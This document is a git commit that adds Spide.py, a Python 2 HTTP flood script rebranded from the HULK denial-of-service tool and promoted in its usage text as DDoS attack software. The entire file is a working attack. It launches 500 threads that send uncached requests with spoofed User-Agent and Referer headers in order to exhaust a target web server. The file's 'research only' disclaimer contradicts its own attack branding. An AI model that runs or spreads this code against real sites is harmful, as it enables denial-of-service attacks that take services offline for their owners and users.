f9b48cf5d57aebe9cdd14701c47a2de1b32b6f4f
Spide Security <119856530+Guruspide@users.noreply.github.com>
2022-12-12 21:58:56 +0530

    Add files via upload

---
+++ Spide.py
@@ -0,0 +1,441 @@
+# ----------------------------------------------------------------------------------------------
+
+# GURU - HTTP Unbearable Load King
+
+#
+
+# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
+
+# to their knees by exhausting the resource pool, its is meant for research purposes only
+
+# and any malicious usage of this tool is prohibited.
+
+#
+
+# author : Barry Shteiman , version 1.0
+
+# ----------------------------------------------------------------------------------------------
+
+import urllib2
+
+import sys
+
+import threading
+
+import random
+
+import re
+
+
+#global params
+
+url=''
+
+host=''
+
+headers_useragents=[]
+
+headers_referers=[]
+
+request_counter=0
+
+flag=0
+
+safe=0
+
+
+def inc_counter():
+
+	global request_counter
+
+	request_counter+=1
+
+
+def set_flag(val):
+
+	global flag
+
+	flag=val
+
+
+def set_safe():
+
+	global safe
+
+	safe=1
+
+
+# generates a user agent array
+
+def useragent_list():
+
+	global headers_useragents
+
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+
+	return(headers_useragents)
+
+
+# generates a referer array
+
+def referer_list():
+
+	global headers_referers
+
+	headers_referers.append('http://www.google.com/?q=')
+
+    headers_referers.append('http://www.usatoday.com/search/results?q=')
+
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
+	headers_referers.append('https://add.my.yahoo.com/rss?url=')
+	
+	
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('https://steamcommunity.com/market/search?q=')
+	headers_referers.append('http://filehippo.com/search?q=')
+	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
+	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
+	headers_referers.append('http://techtv.mit.edu/search?q=')
+	headers_referers.append('http://www.ustream.tv/search?q=')
+	headers_referers.append('http://www.ted.com/search?q=')
+	headers_referers.append('http://funnymama.com/search?q=')
+	headers_referers.append('http://itch.io/search?q=')
+	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
+	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
+	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
+	headers_referers.append('http://www.reddit.com/search?q=')
+	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
+	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
+	headers_referers.append('http://jobs.leidos.com/search?q=')
+	headers_referers.append('http://jobs.bloomberg.com/search?q=')
+	headers_referers.append('https://www.pinterest.com/search/?q=')
+	headers_referers.append('http://millercenter.org/search?q=')
+	headers_referers.append('https://www.npmjs.com/search?q=')
+	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
+	headers_referers.append('http://www.shodanhq.com/search?q=')
+	headers_referers.append('http://ytmnd.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('https://steamcommunity.com/market/search?q=')
+	headers_referers.append('http://filehippo.com/search?q=')
+	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
+	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
+	headers_referers.append('http://techtv.mit.edu/search?q=')
+	headers_referers.append('http://www.ustream.tv/search?q=')
+	headers_referers.append('http://www.ted.com/search?q=')
+	headers_referers.append('http://funnymama.com/search?q=')
+	headers_referers.append('http://itch.io/search?q=')
+	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
+	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
+	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
+	headers_referers.append('http://www.reddit.com/search?q=')
+	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
+	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
+	headers_referers.append('http://jobs.leidos.com/search?q=')
+	headers_referers.append('http://jobs.bloomberg.com/search?q=')
+	headers_referers.append('https://www.pinterest.com/search/?q=')
+	headers_referers.append('http://millercenter.org/search?q=')
+	headers_referers.append('https://www.npmjs.com/search?q=')
+	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
+	headers_referers.append('http://www.shodanhq.com/search?q=')
+	headers_referers.append('http://ytmnd.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('https://steamcommunity.com/market/search?q=')
+	headers_referers.append('http://filehippo.com/search?q=')
+	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
+	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
+	headers_referers.append('http://techtv.mit.edu/search?q=')
+	headers_referers.append('http://www.ustream.tv/search?q=')
+	headers_referers.append('http://www.ted.com/search?q=')
+	headers_referers.append('http://funnymama.com/search?q=')
+	headers_referers.append('http://itch.io/search?q=')
+	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
+	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
+	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
+	headers_referers.append('http://www.reddit.com/search?q=')
+	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
+	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
+	headers_referers.append('http://jobs.leidos.com/search?q=')
+	headers_referers.append('http://jobs.bloomberg.com/search?q=')
+	headers_referers.append('https://www.pinterest.com/search/?q=')
+	headers_referers.append('http://millercenter.org/search?q=')
+	headers_referers.append('https://www.npmjs.com/search?q=')
+	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
+	headers_referers.append('http://www.shodanhq.com/search?q=')
+	headers_referers.append('http://ytmnd.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('https://steamcommunity.com/market/search?q=')
+	headers_referers.append('http://filehippo.com/search?q=')
+	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
+	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
+	headers_referers.append('http://techtv.mit.edu/search?q=')
+	headers_referers.append('http://www.ustream.tv/search?q=')
+	headers_referers.append('http://www.ted.com/search?q=')
+	headers_referers.append('http://funnymama.com/search?q=')
+	headers_referers.append('http://itch.io/search?q=')
+	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
+	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
+	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
+	headers_referers.append('http://www.reddit.com/search?q=')
+	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
+	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
+	headers_referers.append('http://jobs.leidos.com/search?q=')
+	headers_referers.append('http://jobs.bloomberg.com/search?q=')
+	headers_referers.append('https://www.pinterest.com/search/?q=')
+	headers_referers.append('http://millercenter.org/search?q=')
+	headers_referers.append('https://www.npmjs.com/search?q=')
+	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
+	headers_referers.append('http://www.shodanhq.com/search?q=')
+	headers_referers.append('http://ytmnd.com/search?q=')
+	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
+	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
+	headers_referers.append('http://www.google.com/translate?u=')
+	headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
+	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
+	headers_referers.append('http://www.bing.com/search?q=')
+	headers_referers.append('https://add.my.yahoo.com/rss?url=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+
+	headers_referers.append('http://' + host + '/')
+
+	return(headers_referers)
+
+
+#builds random ascii string
+
+def buildblock(size):
+
+	out_str = ''
+
+	for i in range(0, size):
+
+		a = random.randint(65, 90)
+
+		out_str += chr(a)
+
+	return(out_str)
+
+
+def usage():
+
+	print '---------------------------------------------------'
+	print "\a"
+
+
+	print 'USAGE: python Spide.py <url www.kuxbhi.com>'
+
+	print 'Welcom To Spide Security DDoS Attack Software by Guru-------------!'
+	print ' 01010011 01110000 01101001 01100100 01100101 00100000 01010011 01100101 01100011 01110101 01110010 01101001 01110100 01111001 '
+	print 'https://www.facebook.com/profile.php?id=100088380676014&mibextid=ZbWKwL '
+
+	print '---------------------------------------------------'
+
+
+
+#http request
+
+def httpcall(url):
+
+	useragent_list()
+
+	referer_list()
+
+	code=0
+
+	if url.count("?")>0:
+
+		param_joiner="&"
+
+	else:
+
+		param_joiner="?"
+
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+
+	request.add_header('User-Agent', random.choice(headers_useragents))
+
+	request.add_header('Cache-Control', 'no-cache')
+
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+
+	request.add_header('Keep-Alive', random.randint(110,120))
+
+	request.add_header('Connection', 'keep-alive')
+
+	request.add_header('Host',host)
+
+	try:
+
+			urllib2.urlopen(request)
+
+	except urllib2.HTTPError, e:
+
+			#print e.code
+
+			set_flag(1)
+
+			print 'DDoS 1010100000111 Runing Trafic Web code 10000'
+
+			code=10000
+
+	except urllib2.URLError, e:
+
+			#print e.reason
+
+			sys.exit()
+
+	else:
+
+			inc_counter()
+
+			urllib2.urlopen(request)
+
+	return(code)		
+
+
+
+#http caller thread 
+
+class HTTPThread(threading.Thread):
+
+	def run(self):
+
+		try:
+
+			while flag<2:
+
+				code=httpcall(url)
+
+				if (code==10000) & (safe==1):
+
+					set_flag(2)
+
+		except Exception, ex:
+
+			pass
+
+
+# monitors http threads and counts requests
+
+class MonitorThread(threading.Thread):
+
+	def run(self):
+
+		previous=request_counter
+
+		while flag==0:
+
+			if (previous+100<request_counter) & (previous<>request_counter):
+
+				print "%d DDoS Error Requests Sending" % (request_counter)
+
+				previous=request_counter
+
+		if flag==2:
+
+			print "\n-- SpideSec Attack Finished --"
+
+
+#execute 
+
+if len(sys.argv) < 2:
+
+	usage()
+
+	sys.exit()
+
+else:
+
+	if sys.argv[1]=="help":
+
+		usage()
+
+		sys.exit()
+
+	else:
+
+		print "--SpideSec DDoS Attack Started..........wait And and check server in Check Host.. --"
+
+		if len(sys.argv)== 3:
+
+			if sys.argv[2]=="safe":
+
+				set_safe()
+
+		url = sys.argv[1]
+
+		if url.count("/")==2:
+
+			url = url + "/"
+
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+
+		host = m.group(2)
+
+		for i in range(500):
+
+			t = HTTPThread()
+
+			t.start()
+
+		t = MonitorThread()
+
+		t.start()
+
